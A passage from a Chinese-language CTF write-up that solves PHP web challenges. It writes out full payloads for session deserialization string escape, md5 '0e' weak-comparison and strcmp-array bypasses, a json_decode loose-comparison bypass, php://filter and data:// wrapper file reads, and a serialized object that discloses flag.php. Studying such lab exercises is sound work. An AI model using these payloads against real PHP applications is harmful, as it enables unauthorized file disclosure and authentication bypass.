class="hljs-attr">s</span>:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;&quot;</span>;<span class="hljs-attr">s</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;function&quot;</span>;<span class="hljs-attr">s</span>:<span class="hljs-number">38</span>:<span class="hljs-string">&quot;a&quot;</span>;<span class="hljs-attr">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;<span class="hljs-attr">s</span>:<span class="hljs-number">16</span>:<span class="hljs-string">&quot;Wm14aFp5NXdhSEE9&quot;</span>;&#125;<span class="hljs-string">&quot;;s:3:&quot;</span>img<span class="hljs-string">&quot;;s:16:&quot;</span><span class="hljs-title class_">Wm14</span>aFp5NXdhSEE9<span class="hljs-string">&quot;;&#125;&quot;</span> <br><br><span class="hljs-comment">//可以发现s:24:&quot;后面要吞进去24个字符，直到&quot;a这里，然后后面的双引号闭合字符串，分号闭合该变量，于是</span><br><span class="hljs-attr">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;<span class="hljs-attr">s</span>:<span class="hljs-number">16</span>:<span class="hljs-string">&quot;Wm14aFp5NXdhSEE9&quot;</span>;<br><span class="hljs-comment">//就会单独当做img变量，poc如下：</span><br><br>_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[<span class="hljs-keyword">function</span>]=a<span class="hljs-string">&quot;;s:3:&quot;</span>img<span class="hljs-string">&quot;;s:16:&quot;</span><span class="hljs-title class_">Wm14</span>aFp5NXdhSEE9<span class="hljs-string">&quot;;s:2:&quot;</span>dd<span class="hljs-string">&quot;;s:1:&quot;</span>a<span class="hljs-string">&quot;;&#125;  //这里由于前面是3个属性,所以要加一个.</span><br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230819104953440.png'><img src="image-20230819104953440.png" alt="image-20230819104953440"></p>
<p>继续编码访问即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:3:&quot;img&quot;;s:16:&quot;Wm14aFlXRmhZV0Zu&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125; <br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230819105056509.png'><img src="image-20230819105056509.png" alt="image-20230819105056509"></p>
<p>拿到flag，这里说明一下为何传参为<code>_SESSION而不是$_SSEION</code>，这是因为代码中的extract函数，会将传入的post内容进行变量覆盖，而<code>_SESSION</code>这里要当做变量名，故此在后续中会被当做键值然后在作为变量名，也就是自动添加$。</p>
<h3 id="方法二：变量覆盖"><a href="#方法二：变量覆盖" class="headerlink" title="方法二：变量覆盖"></a>方法二：变量覆盖</h3>
<p>这个其实跟方法一差不多，只不过我认为有点烧脑，但也更加简便</p>
<p>我们已经知道我们要传的是：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">_SESSION[img]=;<span class="hljs-attr">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;<span class="hljs-attr">s</span>:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
<p>但由于有一个自动给img变量赋值的语句：<code> $_SESSION['img'] = base64_encode('guest_img.png');</code></p>
<p>因此我们需要利用filter函数，假如我们传入：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">_SESSION[imgphp]=;<span class="hljs-attr">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;<span class="hljs-attr">s</span>:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
<p>那么php被过滤，但此变量依旧存在也就是：<code>_SESSION[img]=;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</code></p>
<p>不会和环境自带的img变量冲突，输入如下</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">&quot;a:1:&#123;s:7:&quot;</span>img<span class="hljs-string">&quot;;s:36:&quot;</span>;<span class="hljs-attr">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;<span class="hljs-attr">s</span>:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;Wm14aFp5NXdhSEE9&quot;</span>;&#125;<span class="hljs-string">&quot;;&#125;&quot;</span> <br><span class="hljs-comment">//由此我们又想到字符串逃逸，我们想法读到s:36:即可，一共10个，那么构造如下</span><br><span class="hljs-string">&quot;a:1:&#123;s:10:&quot;</span>img<span class="hljs-string">&quot;;s:36:&quot;</span>;<span class="hljs-attr">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;<span class="hljs-attr">s</span>:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;Wm14aFp5NXdhSEE9&quot;</span>;&#125;<span class="hljs-string">&quot;;&#125;&quot;</span><span class="hljs-comment">//分号闭合结尾，而环境自带的img变量便读不进去而没用了</span><br><br><span class="hljs-comment">//poc；</span><br>$_SESSION[imgflag]=;<span class="hljs-attr">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;123&quot;</span>;<span class="hljs-attr">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;<span class="hljs-attr">s</span>:<span class="hljs-number">16</span>:<span class="hljs-string">&quot;$_SESSION[imgphpflag]=;s:3:&quot;</span><span class="hljs-number">123</span><span class="hljs-string">&quot;;s:3:&quot;</span>img<span class="hljs-string">&quot;;s:16:&quot;</span><span class="hljs-title class_">Wm14</span>aFp5NXdhSEE9<span class="hljs-string">&quot;;&#125;&quot;</span>;&#125;  <span class="hljs-comment">//但要注意有三个元素,因此这里还要在添加一个,但要添加在前面</span><br><br><span class="hljs-comment">//输出</span><br><span class="hljs-string">&quot;a:1:&#123;s:7:&quot;</span>img<span class="hljs-string">&quot;;s:50:&quot;</span>;<span class="hljs-attr">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;123&quot;</span>;<span class="hljs-attr">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;<span class="hljs-attr">s</span>:<span class="hljs-number">16</span>:<span class="hljs-string">&quot;Wm14aFp5NXdhSEE9&quot;</span>;&#125;<span class="hljs-string">&quot;;&#125;&quot;</span> <span class="hljs-comment">//为了读取到:我们要再添加三个字符,让s:7变成s:10,</span><br><br><span class="hljs-comment">//最终payload</span><br>$_SESSION[imgjpgflag]=;<span class="hljs-attr">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;123&quot;</span>;<span class="hljs-attr">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;<span class="hljs-attr">s</span>:<span class="hljs-number">16</span>:<span class="hljs-string">&quot;Wm14aFp5NXdhSEE9&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
<h3 id="文章参考："><a href="#文章参考：" class="headerlink" title="文章参考："></a>文章参考：</h3>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_52585514/article/details/124291588?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169240856316800225538146%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=169240856316800225538146&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-124291588-null-null.142%5Ev93%5EchatgptT3_1&amp;utm_term=%20%3Cphp%20require%28flag.php%29%3B%20%24function%20%3D%20%40%24_GET%5Bf%5D%3B%20%20function%20filter%28%24img%29%7B%20%20%20%20%20%24filter_arr%20%3D%20array%28jpg%2Cflag%2Cphp5%2Cphp4%2Cfl1g%29%3B%20%20%20%20%20%24filter%20%3D%20%2F.implode%28%7C%2C%24filter_arr%29.%2Fi%3B%20%20%20%20%20return%20pre&amp;spm=1018.2226.3001.4187">参考一</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/xhy18634297976/article/details/123123497?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=%5B%E5%AE%89%E6%B4%B5%E6%9D%AF%202019%5Deasy_serialize_php&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-5-123123497.142%5Ev93%5EchatgptT3_1&amp;spm=1018.2226.3001.4187">参考二</a></p>
<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2>
<p class='item-img' data-src='image-20230819141412238.png'><img src="image-20230819141412238.png" alt="image-20230819141412238"></p>
<p>没信息，点击开始看看</p>
<p class='item-img' data-src='image-20230819141437415.png'><img src="image-20230819141437415.png" alt="image-20230819141437415"></p>
<p>看源代码</p>
<p class='item-img' data-src='image-20230819141448505.png'><img src="image-20230819141448505.png" alt="image-20230819141448505"></p>
<p>base64解码看看</p>
<p class='item-img' data-src='image-20230819141517755.png'><img src="image-20230819141517755.png" alt="image-20230819141517755"></p>
<p>那就访问一下110.php，有点复杂的代码审计，不慌</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;fl0g.php&#x27;</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;mo&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;fish&#x27;</span>])) <br>&#123;<br>    <span class="hljs-variable">$mo</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;mo&#x27;</span>];<br>    <span class="hljs-variable">$fish</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;fish&#x27;</span>];<br>    <span class="hljs-variable">$logined</span>=<span class="hljs-literal">false</span>;<br>    <span class="hljs-variable">$keys</span>=<span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">ctype_alpha</span>(<span class="hljs-variable">$mo</span>))&#123;<span class="hljs-variable">$keys</span>=<span class="hljs-literal">false</span>;&#125;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$fish</span>) )&#123;<span class="hljs-variable">$keys</span>=<span class="hljs-literal">false</span>;&#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$mo</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$fish</span>))<br>&#123;<br>    <span class="hljs-keyword">echo</span><span class="hljs-string">&quot;Let&#x27;s start fishing !&quot;</span>;<br>    <span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]; <br>    &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;f1a9&#x27;</span> === <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>),-<span class="hljs-number">4</span>,<span class="hljs-number">4</span>))<br>        &#123;<br>            <span class="hljs-variable">$password</span>=<span class="hljs-string">&quot;doyoulikemoyu?&quot;</span>;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))<br>            &#123;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strcmp</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>],<span class="hljs-variable">$password</span>) == <span class="hljs-number">0</span>)<br>                &#123;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;message&#x27;</span>])) &#123;<br>                        <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;message&#x27;</span>]);<br>                        <span class="hljs-variable">$key</span> =<span class="hljs-string">&quot;*********&quot;</span>;<br>                        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$message</span>-&gt;key == <span class="hljs-variable">$key</span>)<br>                        &#123;<br>                            <span class="hljs-variable">$logined</span>=<span class="hljs-literal">true</span>;<br>                        &#125;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                    <span class="hljs-keyword">echo</span><span class="hljs-string">&quot;That&#x27;s a little bit !&quot;</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                <span class="hljs-keyword">echo</span><span class="hljs-string">&quot;you don&#x27;t like mo yu ???&quot;</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;You are not far from success !&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br> <span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-keyword">echo</span><span class="hljs-string">&quot;good see you next !&quot;</span>;<br>&#125;<br>&#125;       <br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">echo</span><span class="hljs-string">&quot;Think again !&quot;</span>;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$logined</span>&amp;&amp;<span class="hljs-variable">$keys</span>)<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Congratulations on your successful fishing !&#x27;</span>;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;fl0g.php&#x27;</span>);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;By Wang&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> Think again !<br></code></pre></td></tr></table></figure>
<h3 id="绕过一："><a href="#绕过一：" class="headerlink" title="绕过一："></a>绕过一：</h3>
<p class='item-img' data-src='image-20230819141734887.png'><img src="image-20230819141734887.png" alt="image-20230819141734887"></p>
<p>这里要求输入的内容为字符串</p>
<p class='item-img' data-src='image-20230819141814692.png'><img src="image-20230819141814692.png" alt="image-20230819141814692"></p>
<p>这里则是检测是否为数字，接着配合md5弱比较，但这里不能用数组，因为前面的if会影响变量的布尔值。因此只需要其md5值是以0e开头即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">只要是以0e开头，后面为数字的字符串和字符串0比较值都是相等的，因为不管0不论和多少相乘都是0。<br></code></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">一些例子：<br>1.QNKCDZO<br><br>0e830400451993494058024219903391<br><br>2.s878926199a<br><br>0e545993274517709034328855841020<br><br>3.s155964671a<br><br>0e342768416822451524974117254469<br><br>4.s214587387a<br><br>0e848240448830537924465865611904<br><br>5.s214587387a<br><br>0e848240448830537924465865611904<br><br>6.s878926199a<br><br>0e545993274517709034328855841020<br><br>7.s1091221200a<br><br>0e940624217856561557816327384675<br><br>8.s1885207154a<br><br>0e509367213418206700842008763514<br><br>9.240610708<br><br>0e462097431906509019562988736854<br></code></pre></td></tr></table></figure>
<p>于是这里传参为：<code>?mo=QNKCDZO&amp;fish=240610708</code></p>
<h3 id="绕过二"><a href="#绕过二" class="headerlink" title="绕过二"></a>绕过二:</h3>
<p class='item-img' data-src='image-20230819142415908.png'><img src="image-20230819142415908.png" alt="image-20230819142415908"></p>
<p>第一处要求传入的参数经过md5加密后的后四位与指定的字符串相同，无法，只得上脚本。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100000</span>):<br>    m = hashlib.md5()<br>    m.update(<span class="hljs-built_in">str</span>(i).encode())<br>    h = m.hexdigest()<br>    <span class="hljs-keyword">if</span> h[-<span class="hljs-number">4</span>:] == <span class="hljs-string">&quot;f1a9&quot;</span>:<br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230819142518171.png'><img src="image-20230819142518171.png" alt="image-20230819142518171"></p>
<p>成功！</p>
<h3 id="绕过三："><a href="#绕过三：" class="headerlink" title="绕过三："></a>绕过三：</h3>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$password</span>=<span class="hljs-string">&quot;doyoulikemoyu?&quot;</span>;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))<br>            &#123;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strcmp</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>],<span class="hljs-variable">$password</span>) == <span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure>
<p>这里我不理解这个password的设定，感觉有问题，不过考察点可以知道就是绕过strcmp，考虑其特性</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">strcmp是比较两个字符串，如果两者相等 返回0<br><br>题目要求strcmp判断的接受的值和$password必需相等，strcmp传入的期望类型是字符串类型，<br>那我们传入 password[]=xxx 可以绕过 这是因为函数接受到了不符合的类型，将发生错误，返回null，因此与0比较会判断相等<br></code></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;message&#x27;</span>]);<br>                        <span class="hljs-variable">$key</span> =<span class="hljs-string">&quot;*********&quot;</span>;<br>                        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$message</span>-&gt;key == <span class="hljs-variable">$key</span>)<br>                        &#123;<br>                            <span class="hljs-variable">$logined</span>=<span class="hljs-literal">true</span>;<br>                        &#125;<br></code></pre></td></tr></table></figure>
<h3 id="绕过四："><a href="#绕过四：" class="headerlink" title="绕过四："></a>绕过四：</h3>
<p>这里的key变量就正常了，显然考察的有时json解码</p>
<p class='item-img' data-src='image-20230819142958929.png'><img src="image-20230819142958929.png" alt="image-20230819142958929"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">输入一个json类型的字符串，json_decode函数解密成一个数组，判断数组中key的值是否等于 $key的值，但是$key的值我们不知道，但是可以利用0==&quot;admin&quot;这种形式绕过<br><br>因为说到底这就是个弱比较类型，0与字符串比较都是返回true<br></code></pre></td></tr></table></figure>
<p>故payload如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">get：?mo=QNKCDZO&amp;fish=240610708&amp;b=12400<br>post：password[]=1&amp;message=&#123;&quot;key&quot;:0&#125;<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230819143300410.png'><img src="image-20230819143300410.png" alt="image-20230819143300410"></p>
<p>拿到flag</p>
<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2>
<p>开始审计</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-variable">$text</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;text&quot;</span>];<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;password&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$text</span>)&amp;&amp;(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;flag is here&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Not now!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>(); <br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);  <span class="hljs-comment">//here.php</span><br>        <span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$password</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$password</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
<p>这里传入text参数，并且其中的内容要完全等于&quot;flag is here&quot;，这时候就想到input或者data伪协议</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">使用php://input伪协议绕过<br>	将要GET的参数?xxx=php://input<br>	用post方法传入想要file_get_contents()函数返回的值<br>	<br>	原因：php://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行，当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容，从而导致任意代码执行。<br><br>用data://伪协议绕过<br>	将url改为：?xxx=data://text/plain;base64,想要file_get_contents()函数返回的值的base64编码<br>	或者将url改为：?xxx=data:text/plain,(url编码的内容)<br></code></pre></td></tr></table></figure>
<p>我们有看到<code>here.php</code>文件包含，在这之前我们需要先使用<code>filter</code>协议读取里面的源码。</p>
<p>payload如下：<code>?text=data://text/plain;base64,ZmxhZyBpcyBoZXJl&amp;file=&amp;file=php://filter/convert.base64-encode/resource=here.php</code class='item-img' data-src='image-20230819151127329.png'><img src="image-20230819151127329.png" alt="image-20230819151127329"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;  <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;file))&#123;  <br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;file); <br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;OMO SO CLOSE !///COME ON&quot;</span>);<br>        &#125;  <br>    &#125;  <br>&#125;  <br><span class="hljs-meta">?&gt;</span><br><br>    <br><span class="hljs-comment">//poc如下：</span><br><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;  <br>&#125;  <br><br><span class="hljs-variable">$poc</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>();<br><span class="hljs-variable">$poc</span>-&gt;file=<span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$poc</span>);<br><span class="hljs-meta">?&gt;</span>  <br><span class="hljs-comment">//这里序列化后的字符串被赋值为password，然后再页面有echo $password的语句，故此调用tostring方法，成功读到flag</span><br></code></pre></td></tr></table></figure>
